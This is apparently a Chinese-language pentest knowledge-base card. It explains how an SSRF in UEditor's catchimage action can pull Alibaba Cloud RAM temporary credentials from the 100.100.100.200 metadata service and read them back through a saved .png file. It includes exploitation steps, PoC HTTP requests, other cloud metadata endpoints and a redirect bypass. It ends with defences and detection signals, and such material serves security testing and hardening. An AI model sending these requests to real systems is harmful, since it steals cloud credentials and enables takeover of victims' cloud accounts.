---
id: cloud-metadata-ueditor-catchimage-aliyun-ram-credential
title: SSRF 经 UEditor catchimage 抓取阿里云 ECS/ECI 元数据 RAM 临时凭证并以图片落盘回读
type: scenario
domain: cloud
path: cloud/metadata
technique: ssrf-ueditor-catchimage-aliyun-metadata
tags:
- cloud
- aliyun
- metadata
- ssrf
- ueditor
- credential
- ecs
- eci
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V383
  verified_at: '2026-11-09T08:42:32+08:00'
  notes: 已对照原文核对：UEditor 配置/demo 可访问、catchimage source[] 抓取 100.100.100.200 元数据、落盘 png 后回读三元组与截图一致；未验证点：角色名与 bucket 名在截图中打码，JSON 非图片内容落盘的具体校验逻辑为根据成功结果推断
url: /docs/cloud/metadata/cloud-metadata-ueditor-catchimage-aliyun-ram-credential/
draft: false
kb_aliases:
- UEditor catchimage 打阿里云元数据
- 100.100.100.200 元数据
- 阿里云 RAM 临时凭证 SSRF
- 元数据凭证落盘回读
- catchimage 抓取 security-credentials
---

## 一句话结论

PHP 版 UEditor 的 `catchimage` 会把 `source[]` 里的 URL 交给服务器抓取并把响应按 `.png` 落到 Web 可读目录、返回可访问的图片 URL；把该 URL 指向阿里云元数据服务 `100.100.100.200` 的 RAM 角色凭证路径，就能绕过“元数据只允许本机访问”的限制，以“抓取—落盘—再访问图片”的方式回读 `AccessKeyId`、`AccessKeySecret`、`SecurityToken` 和过期时间，拿到实例 RAM 角色的临时凭证。

## 原理

- **catchimage 是服务端抓取**：UEditor 的远程图片抓取功能由后端发起 HTTP 请求（PHP 版入口通常为 `ueditor/php/controller.php`），`action=catchimage` 时逐个读取 `source[]` 中的 URL，抓取成功后将内容保存到上传目录并返回 JSON，其中 `url` 指向落盘文件。`source[]` 完全由客户端控制，服务器从自身网络位置发起请求，因此能访问仅实例内部可达的地址。
- **阿里云元数据是链路本地信任**：ECS/ECI 实例元数据服务地址为 `100.100.100.200`，默认“普通模式”只按来源 IP（同 VPC 内网）判断，不需要任何凭证；`/latest/meta-data/` 下可枚举实例属性，`/latest/meta-data/ram/security-credentials/<role-name>` 返回绑定该实例的 RAM 角色临时凭证 JSON。外部攻击者无法直达该地址，但 SSRF 让目标服务器“代替”攻击者去访问。
- **非图片响应也会落盘**：目标响应是 JSON 而非图片，但该 PHP 版 catchimage 的落盘/回显路径未对内容做强制图片校验（按来源后缀或仅按状态码保存），因此服务器仍把凭证 JSON 保存为 `.png` 并返回 `state: SUCCESS`。攻击者再请求该图片 URL 即得到完整响应体——SSRF 由此变成有回显的任意响应读取，而不只是盲打。
- **为什么危害大**：临时凭证在 `Expiration` 之前就是可用的阿里云 API 身份，权限等于实例 RAM 角色；若角色被授予 `AdministratorAccess` 等宽权限，可直接升级为云资源接管。

## 触发条件

- 目标为阿里云 ECS/ECI 实例，且实例绑定了 RAM 角色；未绑定角色时 `ram/security-credentials/` 为空或 404。
- 应用暴露了 PHP 版 UEditor 入口（如 `/ueditor/php/controller.php` 或项目内 `apps/common/js/ueditor/php/controller.php`），且 `catchimage` 可用；后台引用了 `ueditor.config.js`、demo 页 `ueditor/index.html` 可直接访问时尤其常见。
- 上传目录可被 Web 访问（catchimage 返回的 `url` 能直接读到），或落盘路径可通过其他方式读取。
- 实例元数据未启用“仅加固模式”（默认普通模式最易利用）；服务器可出站访问 `100.100.100.200`。

## 利用步骤

1. 从前端/后台页面找到 UEditor 配置与控制器路径，确认 `ueditor.config.js`、demo 页与 `action=catchimage` 可用。
2. 先让服务器抓取元数据根目录，确认可达并观察目录列表：`source[]=http://100.100.100.200/latest/meta-data/`。
3. 枚举角色名：`source[]=http://100.100.100.200/latest/meta-data/ram/security-credentials/`，或直接请求已知角色路径 `.../ram/security-credentials/<role-name>`。
4. 从 catchimage 响应里取落盘 `url`（形如 `/ueditor/image/<日期>/<数字>.png`），访问该图片 URL 读取 JSON 中的 `AccessKeyId`、`AccessKeySecret`、`SecurityToken`、`Expiration`。
5. 用三元组配置阿里云 CLI/云利用工具，验证身份与权限（见关联卡），评估影响后停止。

## PoC

```http
GET /apps/common/js/ueditor/php/controller.php?action=catchimage&source[]=http://100.100.100.200/latest/meta-data/ram/security-credentials/<role-name> HTTP/1.1
Host: target
```

```json
// 抓取响应（示意）：服务器已把响应落盘为 png 并返回可访问 URL
{"state":"SUCCESS","list":[{"state":"SUCCESS",
  "url":"/ueditor/image/20240330/1711751882728118.png",
  "original":"<role-name>.png",
  "source":"http://100.100.100.200/latest/meta-data/ram/security-credentials/<role-name>"}]}
```

```http
GET /ueditor/image/20240330/1711751882728118.png HTTP/1.1
Host: target
```

响应体即元数据 JSON：`AccessKeyId`、`AccessKeySecret`、`Expiration`、`SecurityToken`（原文截图中部分字段打码）。角色名不确定时先抓 `/latest/meta-data/ram/security-credentials/` 目录列表。

## 变体与关联

- 变体（云厂商）：AWS `169.254.169.254`（IMDSv1；IMDSv2 需先取 token）、腾讯云 `metadata.tencentyun.com`、GCP `metadata.google.internal`，路径按各厂商文档替换；阿里云 ECS 与 ECI 均使用 `100.100.100.200`。
- 变体（入口）：任何“服务端抓取 URL 并回显/落盘”的接口都能替代 UEditor catchimage，例如图片代理、远程头像、Webhook 测试；若目标校验图片 MIME，可尝试先抓取攻击者控制的图片地址再 302 到元数据（跟随重定向且不复查类型才有用）。
- 关联：[[cloud-metadata-ssrf-imdsv2-token-credential]]（AWS IMDSv2 场景）、[[web-generic-ssrf-j2eefast-ueditor-catchimage]]（Java 版 UEditor catchimage SSRF）、[[web-generic-file-upload-ueditor-net-catchimage-source-remote-write-aspx]]（.NET catchimage 落盘写文件）、[[cloud-cloud-iam-aliyun-temp-credential-cf-console-takeover]]（拿到本卡凭证后的接管链）。

## 检测与防御

- 防御：阿里云元数据访问模式改为“仅加固模式”（需 cloud-init ≥ 23.2.2）——先获取绑定实例、最长 6 小时的元数据访问凭证再访问，且拒绝带 `X-Forwarded-For` 的代理请求，可挡住绝大多数 SSRF。
- 防御：删除/关闭 UEditor demo 与不必要的 `catchimage`；对 `source[]` 做协议白名单（仅 http/https）、解析后 IP 校验（拒绝回环、私网、链路本地 `100.100.100.200`/`169.254.169.254`）并在连接时固定已校验 IP；上传目录禁止解析与直接遍历。
- 防御：为实例 RAM 角色做最小权限；凭证短期化并监控异常使用；UEditor 升级/下线历史版本。
- 检测：应用服务器出站访问 `100.100.100.200` 或 `169.254.169.254`；`controller.php` 出现大量不同 `source[]` 的 catchimage 请求；上传目录出现非图片内容或 JSON 内容的 `.png`；RAM 角色凭证在非预期 IP/时间被调用。
